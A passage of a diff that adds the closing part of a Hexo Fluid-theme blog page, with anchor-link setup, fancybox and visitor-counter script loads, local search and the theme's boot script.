+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script defer src="https://vercount.one/js/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
